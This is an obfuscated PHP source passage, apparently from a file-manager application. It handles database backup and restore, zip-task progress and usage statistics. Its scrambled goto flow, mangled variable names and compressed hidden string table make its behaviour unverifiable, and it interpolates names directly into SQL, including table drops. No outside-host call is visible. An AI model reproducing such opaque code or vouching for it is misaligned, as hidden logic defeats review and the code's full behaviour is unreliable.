$FÀ×å¼É’¹[$d’»÷ïöà[930]]; $FÀ×å¼É’¹[$d’»÷ïöà[930]] = $d’»÷ïöà[33]; if ($FÀ×å¼É’¹[$d’»÷ïöà[754]] == $d’»÷ïöà[755]) { $Fˆ—„øËŠê = $FÀ×å¼É’¹[$d’»÷ïöà[756]]; $FÀ×å¼É’¹[$d’»÷ïöà[756]] = substr($Fˆ—„øËŠê, 0, strrpos($Fˆ—„øËŠê, $d’»÷ïöà[1018])); } goto fƒò›ììÎ¸; E¦ğ‹ ìâ: $this->database = $FÀ×å¼É’¹; $A¨¸òç»œ›->execute("\165\x73\145\x20\140{$c©ç©õŒ«²}\140"); return $A¨¸òç»œ›; goto bĞ»¤•ªç; C‹²›³’Á…: if (!$c×‚ÎË®¥Ñ) { $A¨¸òç»œ›->execute("\143\x72\145\x61\x74\145\x20\144\x61\164\x61\142\141\x73\145\40\x60{$c©ç©õŒ«²}\x60"); } $FÀ×å¼É’¹[$d’»÷ïöà[930]] = $c©ç©õŒ«²; if ($FÀ×å¼É’¹[$d’»÷ïöà[754]] == $d’»÷ïöà[755]) { $FÀ×å¼É’¹[$d’»÷ïöà[756]] .= $d’»÷ïöà[1018] . $c©ç©õŒ«²; } goto E¦ğ‹ ìâ; fƒò›ììÎ¸: $this->database = $FÀ×å¼É’¹; $A¨¸òç»œ› = $this->model()->db(); try { $c×‚ÎË®¥Ñ = $A¨¸òç»œ›->execute("\x73\150\x6f\167\x20\x64\x61\x74\141\x62\141\x73\x65\x73\40\x6c\151\153\145\40\x27{$c©ç©õŒ«²}\47"); } catch (Exception $D™ß“ã¿™‹) { } goto C‹²›³’Á…; CØ¹–…‚†¥: $d’»÷ïöà =& $_SERVER[´¬]; $FÀ×å¼É’¹ = array_change_key_case($this->database); if ($this->type == $d’»÷ïöà[9] || !$bµß¤¦Ë‰ˆ) { return $this->model()->db(); } goto f—ñ¯­¼Úµ; bĞ»¤•ªç: } public function createTable($d®¿´„˜Š÷, $FáÊÒ‰é‘¦ = null) { $fÃ£ÄšÅ•‡ =& $_SERVER[´¬]; if (!IO::exist($d®¿´„˜Š÷)) { ActionCall($fÃ£ÄšÅ•‡[1019], !0, 0); show_json(LNG($fÃ£ÄšÅ•‡[1020]), !1); } $bÔåÍ‚½¦¤ = sqlSplit(IO::getContent($d®¿´„˜Š÷)); foreach ($bÔåÍ‚½¦¤ as $C¬ˆíì¨±Á) { if ($FáÊÒ‰é‘¦) { $fÈÉîêÜÔ¼ = stripos($C¬ˆíì¨±Á, $fÃ£ÄšÅ•‡[1021]) === 0; if ($fÈÉîêÜÔ¼) { $FáÊÒ‰é‘¦->task[$fÃ£ÄšÅ•‡[1022]] += 1; } } $this->model()->db()->execute($C¬ˆíì¨±Á); if ($FáÊÒ‰é‘¦ && $fÈÉîêÜÔ¼) { preg_match($fÃ£ÄšÅ•‡[1023], $C¬ˆíì¨±Á, $FÑ®£·÷šÛ); $FáÊÒ‰é‘¦->task[$fÃ£ÄšÅ•‡[1024]] = $FÑ®£·÷šÛ[1]; $FáÊÒ‰é‘¦->update(1); } } $this->taskToCache($FáÊÒ‰é‘¦); } public function insertTable($eƒ‘Ä…£ƒ, $AÃ´è©¼Ş¾ = null) { $A¼‘›‹§¬ª =& $_SERVER[´¬]; $b¥œÈ·Ü¨ = $this->model()->db(); $e‰Íïâß˜ = $a‡Ò‘¨¡Ó³ ? array($a‡Ò‘¨¡Ó³) : $b¥œÈ·Ü¨->getTables(); foreach ($eƒ‘Ä…£ƒ as $cœ ç«™’) { $a‡Ò‘¨¡Ó³ = basename($cœ ç«™’, $A¼‘›‹§¬ª[746]); if (!in_array($a‡Ò‘¨¡Ó³, $e‰Íïâß˜)) { continue; } if ($AÃ´è©¼Ş¾) { $AÃ´è©¼Ş¾->task[$A¼‘›‹§¬ª[1024]] = $a‡Ò‘¨¡Ó³; } if (get_filesize($cœ ç«™’) == 0) { continue; } $dÊ¥áî•Ø = $this->sqlToDb($cœ ç«™’, $AÃ´è©¼Ş¾); if (!$dÊ¥áî•Ø) { ActionCall($A¼‘›‹§¬ª[1019], !0, 0); show_json(LNG($A¼‘›‹§¬ª[1025]) . "\x5b{$a‡Ò‘¨¡Ó³}\135", !1); } } $this->taskToCache($AÃ´è©¼Ş¾); } public function sqlFromDb($e‚ìš§Äí¥, $d³½²Êíé, $b×È¦…Ë‚Ë = null, $EáßÀà«°¥ = null) { goto BæƒšÉÁõÉ; BæƒšÉÁõÉ: if ($b×È¦…Ë‚Ë) { $b×È¦…Ë‚Ë->task[$_SERVER[´¬][1024]] = $e‚ìš§Äí¥; } $C‡Ÿñ–Ë­Ì = $this->model($e‚ìš§Äí¥); $dÏ©çÔ£¥Ù = 0; goto Eô„ª£¼Ò”; EÔÛ…‹Å˜: fclose($Fóä‡Ğîƒì); return $dÏ©çÔ£¥Ù; goto få–ßƒÚ; aòô«ÂÙ‚: $Cäê¿Ã… = $C‡Ÿñ–Ë­Ì->getPk(); $E…¦·µ¨™º = $C‡Ÿñ–Ë­Ì->getDbFields(); do { $fñ£†°ê„Ë = array($Cäê¿Ã… => array($_SERVER[´¬][972], $CÍîÜôÒ¥‡)); $Eß¤àÅ¦Œì = $C‡Ÿñ–Ë­Ì->where($fñ£†°ê„Ë)->field($E…¦·µ¨™º)->order($Cäê¿Ã… . $_SERVER[´¬][1027])->limit($dèç±‹‚‡ê)->select(); $Eß¤àÅ¦Œì = !empty($Eß¤àÅ¦Œì) ? $Eß¤àÅ¦Œì : array(); if (!($e¶¾ÁŸÍ = count($Eß¤àÅ¦Œì))) { break; } $F¸’Êó»èá = end($Eß¤àÅ¦Œì); $CÍîÜôÒ¥‡ = $F¸’Êó»èá[$Cäê¿Ã…]; $Cã¢İ¡¡¥Ç = array(); foreach ($Eß¤àÅ¦Œì as $a¢¶º•„‰³) { if ($e‚ìš§Äí¥ == $_SERVER[´¬][1028] && $a¢¶º•„‰³[$_SERVER[´¬][29]] == $_SERVER[´¬][1029]) { $F¡÷éòÏĞ = json_decode($a¢¶º•„‰³[$_SERVER[´¬][371]], !0); if ($F¡÷éòÏĞ[$_SERVER[´¬][28]] == date($_SERVER[´¬][714]) && !$F¡÷éòÏĞ[$_SERVER[´¬][713]]) { continue; } } if ($EáßÀà«°¥) { $a¢¶º•„‰³[$_SERVER[´¬][76]] = "\173\x69\x6f\72{$EáßÀà«°¥}\175" . substr($a¢¶º•„‰³[$_SERVER[´¬][76]], strlen("\173\151\157\x3a{$a¢¶º•„‰³[$_SERVER[´¬][782]]}\x7d")); $a¢¶º•„‰³[$_SERVER[´¬][782]] = $EáßÀà«°¥; } $Cã¢İ¡¡¥Ç[] = $_SERVER[´¬][1030] . $this->sqlEncode($a¢¶º•„‰³) . $_SERVER[´¬][1031]; } $FÓä—Õ† = "\111\x4e\x53\x45\x52\124\40\111\x4e\124\117\x20\140{$e‚ìš§Äí¥}\x60\x20\50\140" . implode($_SERVER[´¬][1032], $E…¦·µ¨™º) . $_SERVER[´¬][1033]; fwrite($Fóä‡Ğîƒì, $FÓä—Õ† . implode($_SERVER[´¬][1034], $Cã¢İ¡¡¥Ç) . $_SERVER[´¬][68] . PHP_EOL); $dÏ©çÔ£¥Ù += $e¶¾ÁŸÍ; if ($b×È¦…Ë‚Ë) { $b×È¦…Ë‚Ë->update($e¶¾ÁŸÍ); } } while ($dèç±‹‚‡ê == $e¶¾ÁŸÍ); goto EÔÛ…‹Å˜; Eô„ª£¼Ò”: $CÍîÜôÒ¥‡ = 0; $dèç±‹‚‡ê = 10000; $Fóä‡Ğîƒì = fopen($d³½²Êíé, $_SERVER[´¬][1026]); goto aòô«ÂÙ‚; få–ßƒÚ: } public function sqlToDb($bñÉˆ´Ó–ô, $FåÔŒ¯Ö¾á = null) { goto bÑ¬ÈİÀ’¼; E…¤÷Ô†¶¤: if ($c¶ÔÀã‹Ù« == $cçó‰¦¤Šœ[1036]) { $a¤³š•»ˆÂ = 50; } while (!feof($b·Í¶Ìë¨)) { $bâÀ‘é»æ— = trim(fgets($b·Í¶Ìë¨)); if (!$bâÀ‘é»æ—) { continue; } $bÈÓ•‡’Çç = $this->sqlDecode($bâÀ‘é»æ—, $this->type); if (stripos($bÈÓ•‡’Çç, $cçó‰¦¤Šœ[354]) === 0) { if (!$f™ÂØïóã) { $f™ÂØïóã = $bÈÓ•‡’Çç . $cçó‰¦¤Šœ[50]; } continue; } if ($FåÔŒ¯Ö¾á) { $FåÔŒ¯Ö¾á->task[$cçó‰¦¤Šœ[1022]] += 1; } $B™ÕÒî„”‘++; $bœö‚¤ò³Ä[] = rtrim(rtrim(trim($bÈÓ•‡’Çç), $cçó‰¦¤Šœ[47]), $cçó‰¦¤Šœ[68]); if ($B™ÕÒî„”‘ >= $a¤³š•»ˆÂ) { $bÈÓ•‡’Çç = $f™ÂØïóã . implode($cçó‰¦¤Šœ[47], $bœö‚¤ò³Ä); if (!$dë«ìËÍ->execute($bÈÓ•‡’Çç)) { return !1; } if ($FåÔŒ¯Ö¾á) { $FåÔŒ¯Ö¾á->update($B™ÕÒî„”‘); } $bœö‚¤ò³Ä = array(); $B™ÕÒî„”‘ = 0; } } fclose($b·Í¶Ìë¨); goto e¤Ş¹ãº‰; a¤ôÂ÷¶“Ú: $bœö‚¤ò³Ä = array(); $a¤³š•»ˆÂ = $this->type == $cçó‰¦¤Šœ[9] ? 500 : 2000; $c¶ÔÀã‹Ù« = basename($bñÉˆ´Ó–ô, $cçó‰¦¤Šœ[746]); goto E…¤÷Ô†¶¤; bÑ¬ÈİÀ’¼: $cçó‰¦¤Šœ =& $_SERVER[´¬]; $dë«ìËÍ = $this->model()->db(); $b·Í¶Ìë¨ = @fopen($bñÉˆ´Ó–ô, $cçó‰¦¤Šœ[1035]); goto b—›²µ‘¨ß; b—›²µ‘¨ß: if (!$b·Í¶Ìë¨) { return !1; } $B™ÕÒî„”‘ = 0; $f™ÂØïóã = $cçó‰¦¤Šœ[33]; goto a¤ôÂ÷¶“Ú; e¤Ş¹ãº‰: if (!empty($bœö‚¤ò³Ä)) { $bÈÓ•‡’Çç = $f™ÂØïóã . implode($cçó‰¦¤Šœ[47], $bœö‚¤ò³Ä); if (!$dë«ìËÍ->execute($bÈÓ•‡’Çç)) { return !1; } if ($FåÔŒ¯Ö¾á) { $FåÔŒ¯Ö¾á->update($B™ÕÒî„”‘); } } return !0; goto aŸ‡ãİØ‰«; aŸ‡ãİØ‰«: } public function dropTable($B“‰÷¢äµ¦ = null) { $FÚÃ±µºÎŒ = $this->model()->db(); $EøÙØéŠ×» = $B“‰÷¢äµ¦ ? array($B“‰÷¢äµ¦) : $FÚÃ±µºÎŒ->getTables(); if (!$EøÙØéŠ×») { return; } foreach ($EøÙØéŠ×» as $B“‰÷¢äµ¦) { $FÚÃ±µºÎŒ->execute("\x64\162\157\x70\x20\164\141\x62\x6c\x65\x20\x69\x66\x20\145\x78\151\163\x74\163\x20\140{$B“‰÷¢äµ¦}\140"); } } private function taskToCache($c«„Š™¥‘• = null) { $eã‡¬ìê†ã =& $_SERVER[´¬]; if (!$c«„Š™¥‘•) { return; } $Dë¢•ï³®ˆ = array($eã‡¬ìê†ã[1024] => $c«„Š™¥‘•->task[$eã‡¬ìê†ã[1024]], $eã‡¬ìê†ã[1022] => $c«„Š™¥‘•->task[$eã‡¬ìê†ã[1022]], $eã‡¬ìê†ã[1037] => $c«„Š™¥‘•->task[$eã‡¬ìê†ã[1037]]); if ($Dë¢•ï³®ˆ[$eã‡¬ìê†ã[1022]] == $Dë¢•ï³®ˆ[$eã‡¬ìê†ã[1037]]) { $Dë¢•ï³®ˆ[$eã‡¬ìê†ã[720]] = 1; } Cache::set($eã‡¬ìê†ã[1038] . $c«„Š™¥‘•->task[$eã‡¬ìê†ã[392]], $Dë¢•ï³®ˆ); $c«„Š™¥‘•->end(); } private function sqlEncode($Dêö§ÓèÓ) { $D»¢È†Êœ =& $_SERVER[´¬]; $a¤„ìÃ¶¸¹ = array(); foreach ($Dêö§ÓèÓ as $aª‹ëµœ„ê) { if (is_array($aª‹ëµœ„ê)) { $aª‹ëµœ„ê = json_encode_force($aª‹ëµœ„ê); } $aª‹ëµœ„ê = addslashes($aª‹ëµœ„ê); $aª‹ëµœ„ê = str_replace(array($D»¢È†Êœ[1039], $D»¢È†Êœ[228]), array($D»¢È†Êœ[1040], $D»¢È†Êœ[1041]), $aª‹ëµœ„ê); $a¤„ìÃ¶¸¹[] = str_replace($D»¢È†Êœ[55], $D»¢È†Êœ[1042], $aª‹ëµœ„ê); } return $D»¢È†Êœ[55] . implode($D»¢È†Êœ[1043], $a¤„ìÃ¶¸¹) . $D»¢È†Êœ[55]; } private function sqlDecode($cÜµ…˜çªÁ, $cµÈ¬ä¡­Ş) { $A»àÍ©É§Ô =& $_SERVER[´¬]; $cÜµ…˜çªÁ = str_replace(array($A»àÍ©É§Ô[1040], $A»àÍ©É§Ô[1041]), array($A»àÍ©É§Ô[1039], $A»àÍ©É§Ô[228]), $cÜµ…˜çªÁ); if ($cµÈ¬ä¡­Ş == $A»àÍ©É§Ô[9]) { $cÜµ…˜çªÁ = stripslashes($cÜµ…˜çªÁ); } return $cÜµ…˜çªÁ; } } goto bŠ´¡½¥¡¯; bÓ–ğÄŠ¡: $f™ã°¡È¡È = $_SERVER[´¬][573]; $_SERVER[…‹Çæ¦§] = explode($_SERVER[´¬][574], gzinflate(substr($_SERVER[´¬][575], 10, -8))); $DŒõíÚòá = $_SERVER[´¬][576]; goto C­ÒŸîŠ‰; B°Æ«ÎšÀ¬: class TaskZip extends TaskFileTransfer { protected function startAfter() { $aëšÁ“‹¯õ =& $_SERVER[´¬]; parent::startAfter(); Hook::bind($aëšÁ“‹¯õ[1613], array($this, $aëšÁ“‹¯õ[1608])); $B™®’±›çî =& $this->task; $B™®’±›çî[$aëšÁ“‹¯õ[1610]] = $aëšÁ“‹¯õ[1095]; if (!$B™®’±›çî[$aëšÁ“‹¯õ[1432]]) { $B™®’±›çî[$aëšÁ“‹¯õ[1432]] = LNG($aëšÁ“‹¯õ[1614]); } } protected function endAfter() { $EÚÛèš•§° =& $_SERVER[´¬]; parent::endAfter(); Hook::unbind($EÚÛèš•§°[1613], array($this, $EÚÛèš•§°[1608])); } public function updateAfter() { $e×É°Şïƒ× =& $_SERVER[´¬]; $BãÙŸ·¾‹¿ =& $this->task; if (!$BãÙŸ·¾‹¿[$e×É°Şïƒ×[1022]] || !$BãÙŸ·¾‹¿[$e×É°Şïƒ×[723]]) { return; } if ($BãÙŸ·¾‹¿[$e×É°Şïƒ×[1610]] == $e×É°Şïƒ×[1095]) { $EöÒì†÷¨Ş = $BãÙŸ·¾‹¿[$e×É°Şïƒ×[1570]]; if ($BãÙŸ·¾‹¿[$e×É°Şïƒ×[1571]] != $e×É°Şïƒ×[1095]) { $EöÒì†÷¨Ş = 0; } $fæ‡¢Ô¸¹™ = ($BãÙŸ·¾‹¿[$e×É°Şïƒ×[1574]] + $EöÒì†÷¨Ş) / $BãÙŸ·¾‹¿[$e×É°Şïƒ×[723]]; $BãÙŸ·¾‹¿[$e×É°Şïƒ×[1527]] = $fæ‡¢Ô¸¹™ * 0.3; } else { if ($BãÙŸ·¾‹¿[$e×É°Şïƒ×[1610]] == $e×É°Şïƒ×[310]) { $fæ‡¢Ô¸¹™ = $BãÙŸ·¾‹¿[$e×É°Şïƒ×[1037]] / $BãÙŸ·¾‹¿[$e×É°Şïƒ×[1022]]; $BãÙŸ·¾‹¿[$e×É°Şïƒ×[1527]] = 0.3 + $fæ‡¢Ô¸¹™ * 0.5; } else { if ($BãÙŸ·¾‹¿[$e×É°Şïƒ×[1610]] == $e×É°Şïƒ×[107]) { $fæ‡¢Ô¸¹™ = 0; if ($BãÙŸ·¾‹¿[$e×É°Şïƒ×[1569]]) { $fæ‡¢Ô¸¹™ = $BãÙŸ·¾‹¿[$e×É°Şïƒ×[1570]] / $BãÙŸ·¾‹¿[$e×É°Şïƒ×[1569]]; } $BãÙŸ·¾‹¿[$e×É°Şïƒ×[1527]] = 0.3 + 0.5 + $fæ‡¢Ô¸¹™ * 0.2; } } } if ($BãÙŸ·¾‹¿[$e×É°Şïƒ×[1527]] > 0) { $A£Ûš¤º = timeFloat() - $BãÙŸ·¾‹¿[$e×É°Şïƒ×[749]] - $BãÙŸ·¾‹¿[$e×É°Şïƒ×[1530]]; $BãÙŸ·¾‹¿[$e×É°Şïƒ×[1531]] = $A£Ûš¤º * (1 - $BãÙŸ·¾‹¿[$e×É°Şïƒ×[1527]]) / $BãÙŸ·¾‹¿[$e×É°Şïƒ×[1527]]; } } public function copyFileStart($Dš¢Ÿƒãô, $EõÈŒã³Ä, $BŞ„ïë¡ó‹, $c¾”·óÔÃ÷, $Eï¥²‘ğÚ¾, $aƒŸ¯½óœì) { $c†íò ÖÇ‡ =& $_SERVER[´¬]; parent::copyFileStart($Dš¢Ÿƒãô, $EõÈŒã³Ä, $BŞ„ïë¡ó‹, $c¾”·óÔÃ÷, $Eï¥²‘ğÚ¾, $aƒŸ¯½óœì); $A—è„¸Ø®¦ =& $this->task; if ($A—è„¸Ø®¦[$c†íò ÖÇ‡[1610]] == $c†íò ÖÇ‡[310]) { $A—è„¸Ø®¦[$c†íò ÖÇ‡[1610]] = $c†íò ÖÇ‡[107]; } $this->update(); } public function copyFileEnd($F˜òŒöù§Á, $a¯©ã¿Õ³®, $AèÙ¿ó«‹, $Bëİµßâ—ù, $DÑ°çÆÌã, $FïâĞ´ŠÚ) { $EØç°Ùµ±´ =& $_SERVER[´¬]; $E‡ ¤áŒ‘æ =& $this->task; $E‡ ¤áŒ‘æ[$EØç°Ùµ±´[1570]] = $E‡ ¤áŒ‘æ[$EØç°Ùµ±´[1569]]; $E‡ ¤áŒ‘æ[$EØç°Ùµ±´[1574]] += $E‡ ¤áŒ‘æ[$EØç°Ùµ±´[1569]]; $E‡ ¤áŒ‘æ[$EØç°Ùµ±´[1571]] = $EØç°Ùµ±´[33]; $this->update(); } public function nameParse($d™ŒçŞô«Ó) { $A¬½†ÅÖˆå =& $_SERVER[´¬]; $EÆß„¥Ù»æ =& $this->task; if ($EÆß„¥Ù»æ[$A¬½†ÅÖˆå[1037]] < $EÆß„¥Ù»æ[$A¬½†ÅÖˆå[1022]]) { $e‹Ì®Ï‘ = get_path_this($d™ŒçŞô«Ó); if (strstr($e‹Ì®Ï‘, $A¬½†ÅÖˆå[95])) { $EÆß„¥Ù»æ[$A¬½†ÅÖˆå[1037]] += 1; } } if ($EÆß„¥Ù»æ[$A¬½†ÅÖˆå[1610]] == $A¬½†ÅÖˆå[1095]) { $EÆß„¥Ù»æ[$A¬½†ÅÖˆå[1610]] = $A¬½†ÅÖˆå[310]; } $EÆß„¥Ù»æ[$A¬½†ÅÖˆå[1567]] = $d™ŒçŞô«Ó; $this->update(); } } class AnalysisModel extends ModelBaseLight { public function init($b ‘ÄÂ¬ğ®) { $B™»ƒäãœø =& $_SERVER[´¬]; $Eê£Ü†¥»« = array($B™»ƒäãœø[561] => array($B™»ƒäãœø[29] => $B™»ƒäãœø[1615], $B™»ƒäãœø[270] => array($B™»ƒäãœø[221], $B™»ƒäãœø[725], $B™»ƒäãœø[1616], $B™»ƒäãœø[1617])), $B™»ƒäãœø[1618] => array($B™»ƒäãœø[29] => $B™»ƒäãœø[1619], $B™»ƒäãœø[270] => array($B™»ƒäãœø[221], $B™»ƒäãœø[723], $B™»ƒäãœø[1620], $B™»ƒäãœø[1621], $B™»ƒäãœø[1622]))); if (!isset($Eê£Ü†¥»«[$b ‘ÄÂ¬ğ®])) { return !1; } $this->optionType = $Eê£Ü†¥»«[$b ‘ÄÂ¬ğ®][$B™»ƒäãœø[29]]; $this->field = $Eê£Ü†¥»«[$b ‘ÄÂ¬ğ®][$B™»ƒäãœø[270]]; return !0; } public function listData($dó¸îŠÙœ² = false, $d¦À·³÷ÍÈ = "\155\157\144\x69\x66\x79\124\x69\x6d\145", $fÊ±‚ŸÇí = false) { return parent::listData($dó¸îŠÙœ², $d¦À·³÷ÍÈ, $fÊ±‚ŸÇí); } public function trendList($c÷’ÛÀˆ¢‚) { goto b—±¨ÆÔÖ…; b—±¨ÆÔÖ…: $FŒÀ¥ˆğ§ =& $_SERVER[´¬]; $CÀ²Ô‡Øåù = $this->listData(); if ($CÀ²Ô‡Øåù) { $AŸµòøœ”² = end($CÀ²Ô‡Øåù); $E·ùƒÜÅ = date($FŒÀ¥ˆğ§[1623], strtotime($FŒÀ¥ˆğ§[1624])); if ($AŸµòøœ”²[$FŒÀ¥ˆğ§[221]] == $E·ùƒÜÅ) { return $CÀ²Ô‡Øåù; } $fÊĞ„¥Áœ˜ = strtotime($AŸµòøœ”²[$FŒÀ¥ˆğ§[221]]); } goto fœŒ¸öİÑ; fœŒ¸öİÑ: if (!isset($fÊĞ„¥Áœ˜)) { $EîâŸš“íÀ = $c÷’ÛÀˆ¢‚ == $FŒÀ¥ˆğ§[561] ? $FŒÀ¥ˆğ§[505] : $FŒÀ¥ˆğ§[790]; $fÊĞ„¥Áœ˜ = Model($EîâŸš“íÀ)->min($FŒÀ¥ˆğ§[193]); } $AÊÊ‡‘‹ÌÂ = $FŒÀ¥ˆğ§[1625] . ucfirst($c÷’ÛÀˆ¢‚); $d† ¥Ø«‘ = $this->dateList($fÊĞ„¥Áœ˜); goto f©„‰áƒ²Ï; f©„‰áƒ²Ï: foreach ($d† ¥Ø«‘ as $E·ùƒÜÅ) { $this->{$AÊÊ‡‘‹ÌÂ}($E·ùƒÜÅ); } return $this->listData(); goto c„Ä§µ‘Ã×; c„Ä§µ‘Ã×: } private function dateList($aõè§÷„§) { $fóœçŠ±˜ß =& $_SERVER[´¬]; $c»ÇÌ¾‘Áİ = $aõè§÷„§; $DÇ¤ö¼î¡– = strtotime($fóœçŠ±˜ß[1624]); $EÍ „Œ…Ú  = array(); while ($c»ÇÌ¾‘Áİ <= $DÇ¤ö¼î¡–) { $EÍ „Œ…Ú [] = date($fóœçŠ±˜ß[1623], $c»ÇÌ¾‘Áİ); $c»ÇÌ¾‘Áİ = strtotime($fóœçŠ±˜ß[1626], $c»ÇÌ¾‘Áİ); } return $EÍ „Œ…Ú ; } public function _recordUser($aôŠÑ“ÉÙ = '') { goto fÓÆÏ±Ëšì; DØª³¥“Õ•: $FİŸƒì‹ò = Model($D°ÇÍ¬õ¢[505])->where($EŒÅí…³š)->count($D°ÇÍ¬õ¢[1526]); $EŒÅí…³š[$D°ÇÍ¬õ¢[29]] = $D°ÇÍ¬õ¢[1629]; $b±ÙèòëÌ¸ = Model($D°ÇÍ¬õ¢[1630])->where($EŒÅí…³š)->count($D°ÇÍ¬õ¢[1631]); goto c¯ªÛ“×ò; D¤¡Ì˜Ší…: $EŒÅí…³š = array($D°ÇÍ¬õ¢[193] => array($D°ÇÍ¬õ¢[971], $F¢âã§‚)); $Bá‘Ğ©‡è = Model($D°ÇÍ¬õ¢[505])->where($EŒÅí…³š)->count($D°ÇÍ¬õ¢[1526]); $EŒÅí…³š[$D°ÇÍ¬õ¢[193]] = array($D°ÇÍ¬õ¢[330], array($e¶Ã–˜Â›’, $F¢âã§‚)); goto DØª³¥“Õ•; fÓÆÏ±Ëšì: $D°ÇÍ¬õ¢ =& $_SERVER[´¬]; $e¶Ã–˜Â›’ = strtotime(date($D°ÇÍ¬õ¢[1627], strtotime($aôŠÑ“ÉÙ))); $F¢âã§‚ = strtotime(date($D°ÇÍ¬õ¢[1628], strtotime($aôŠÑ“ÉÙ))); goto D¤¡Ì˜Ší…; c¯ªÛ“×ò: $a’»˜Ï‹¦Á = array($D°ÇÍ¬õ¢[221] => $aôŠÑ“ÉÙ, $D°ÇÍ¬õ¢[725] => (int) $Bá‘Ğ©‡è, $D°ÇÍ¬õ¢[1616] => (int) $FİŸƒì‹ò, $D°ÇÍ¬õ¢[1617] => (int) $b±ÙèòëÌ¸); return $this->insert($a’»˜Ï‹¦Á); goto AÜé´Ìâáß; AÜé´Ìâáß: } public function _recordStore($A˜Ë‰®í„Í = '') { goto f”òæòƒ²ì; fä÷¸¥±Ñ·: $Bß‡²¡¾Ú = Model($BíéÅÔèøê[448])->where($c£¨àõÙó¢)->sum($BíéÅÔèøê[78]); $c£¨àõÙó¢[$BíéÅÔèøê[401]] = 0; $döİëè²Óï = Model($BíéÅÔèøê[790])->where($c£¨àõÙó¢)->sum($BíéÅÔèøê[78]); goto eêêÏ‹¹Ø; eêêÏ‹¹Ø: $c£¨àõÙó¢[$BíéÅÔèøê[402]] = 1; $F½¢‰¢ˆ´‚ = Model($BíéÅÔèøê[790])->where($c£¨àõÙó¢)->sum($BíéÅÔèøê[78]); $c£¨àõÙó¢[$BíéÅÔèøê[402]] = 2; goto b¶åõË±ôİ; f”òæòƒ²ì: $BíéÅÔèøê =& $_SERVER[´¬]; $cÍ®—¹Åáƒ = strtotime(date($BíéÅÔèøê[1628], strtotime($A˜Ë‰®í„Í))); $c£¨àõÙó¢ = array($BíéÅÔèøê[193] => array($BíéÅÔèøê[971], $cÍ®—¹Åáƒ)); goto fä÷¸¥±Ñ·; b¶åõË±ôİ: $D”Ã‡¢ÄÏ = Model($BíéÅÔèøê[790])->where($c£¨àõÙó¢)->sum($BíéÅÔèøê[78]); $Bã·â·‡æ’ = array($BíéÅÔèøê[221] => $A˜Ë‰®í„Í, $BíéÅÔèøê[723] => (int) $döİëè²Óï, $BíéÅÔèøê[1620] => (int) $Bß‡²¡¾Ú, $BíéÅÔèøê[1621] => (int) $F½¢‰¢ˆ´‚, $BíéÅÔèøê[1622] => (int) $D”Ã‡¢ÄÏ); return $this->insert($Bã·â·‡æ’); goto aŸ±Æ°§Å; aŸ±Æ°§Å: } public function trend($AºÈ…ù™, $E˜˜”‰°ÆÇ) { goto b¯ÁìíÜğ; eÆµ³£á: if ($B¢İù‘˜… && $E˜˜”‰°ÆÇ != $CëÄŞİƒ¤“[1500]) { $B¤©ßÑÎë« = $B¢İù‘˜…[0][$CëÄŞİƒ¤“[221]]; $aĞ—ÛéÅÈ = $this->validDate($E˜˜”‰°ÆÇ, $B¤©ßÑÎë«); $dã¯ïÙö = array(); $bÎ»¼î¦À¹ = array_to_keyvalue($B¢İù‘˜…, $CëÄŞİƒ¤“[221]); foreach ($aĞ—ÛéÅÈ as $DíÛíïÒÆ) { if (isset($bÎ»¼î¦À¹[$DíÛíïÒÆ])) { $F†Ù—¶©‡± = $bÎ»¼î¦À¹[$DíÛíïÒÆ]; } else { $F†Ù—¶©‡± = end($B¢İù‘˜…); $F†Ù—¶©‡±[$CëÄŞİƒ¤“[221]] = $DíÛíïÒÆ; if ($AºÈ…ù™ == $CëÄŞİƒ¤“[561]) { $F†Ù—¶©‡±[$CëÄŞİƒ¤“[1616]] = $F†Ù—¶©‡±[$CëÄŞİƒ¤“[1617]] = 0; } } $dã¯ïÙö[] = $F†Ù—¶©‡±; } $B¢İù‘˜… = $dã¯ïÙö; } $Cš³ÕÒ¡ç  = array($CëÄŞİƒ¤“[561] => array($CëÄŞİƒ¤“[725] => LNG($CëÄŞİƒ¤“[1632]), $CëÄŞİƒ¤“[1616] => LNG($CëÄŞİƒ¤“[1633]), $CëÄŞİƒ¤“[1617] => LNG($CëÄŞİƒ¤“[1634])), $CëÄŞİƒ¤“[1618] => array($CëÄŞİƒ¤“[723] => LNG($CëÄŞİƒ¤“[1635]), $CëÄŞİƒ¤“[1620] => LNG($CëÄŞİƒ¤“[1636]), $CëÄŞİƒ¤“[1621] => LNG($CëÄŞİƒ¤“[1637]), $CëÄŞİƒ¤“[1622] => LNG($CëÄŞİƒ¤“[1638]))); $dÇ¶ÜËÄÉ = array($CëÄŞİƒ¤“[561] => $CëÄŞİƒ¤“[1639], $CëÄŞİƒ¤“[1618] => $CëÄŞİƒ¤“[78]); goto dåó»ÈĞîÆ; b¯ÁìíÜğ: $CëÄŞİƒ¤“ =& $_SERVER[´¬]; if (!$this->init($AºÈ…ù™)) { return !1; } $B¢İù‘˜… = $this->trendList($AºÈ…ù™); goto eÆµ³£á; añÒ‹¡œ»¢: return $e«‚¶Û¥¤„; goto Cñ¼ßÛ†Àá; dåó»ÈĞîÆ: if (empty($B¢İù‘˜…)) { $DíÛíïÒÆ = date($CëÄŞİƒ¤“[1623], strtotime($CëÄŞİƒ¤“[1624])); $aŸ‹ÕêÇå = array($CëÄŞİƒ¤“[221] => $DíÛíïÒÆ); foreach ($Cš³ÕÒ¡ç [$AºÈ…ù™] as $fœßùáÅº => $fÕº£º‹®Ë) { $aŸ‹ÕêÇå[$fœßùáÅº] = 0; } $B¢İù‘˜…[] = $aŸ‹ÕêÇå; } $e«‚¶Û¥¤„ = array(); foreach ($B¢İù‘˜… as $fÕº£º‹®Ë) { if ($AºÈ…ù™ == $CëÄŞİƒ¤“[1618] && $fÕº£º‹®Ë[$CëÄŞİƒ¤“[1620]] > $fÕº£º‹®Ë[$CëÄŞİƒ¤“[723]]) { $fÕº£º‹®Ë[$CëÄŞİƒ¤“[1620]] = $fÕº£º‹®Ë[$CëÄŞİƒ¤“[723]]; } foreach ($Cš³ÕÒ¡ç [$AºÈ…ù™] as $fœßùáÅº => $C‰µ â±Ï¥) { $F†Ù—¶©‡± = array($CëÄŞİƒ¤“[221] => $fÕº£º‹®Ë[$CëÄŞİƒ¤“[221]], $CëÄŞİƒ¤“[1432] => $C‰µ â±Ï¥); $F†Ù—¶©‡±[$dÇ¶ÜËÄÉ[$AºÈ…ù™]] = isset($fÕº£º‹®Ë[$fœßùáÅº]) ? $fÕº£º‹®Ë[$fœßùáÅº] : 0; $e«‚¶Û¥¤„[] = $F†Ù—¶©‡±; } } goto añÒ‹¡œ»¢; Cñ¼ßÛ†Àá: } public function 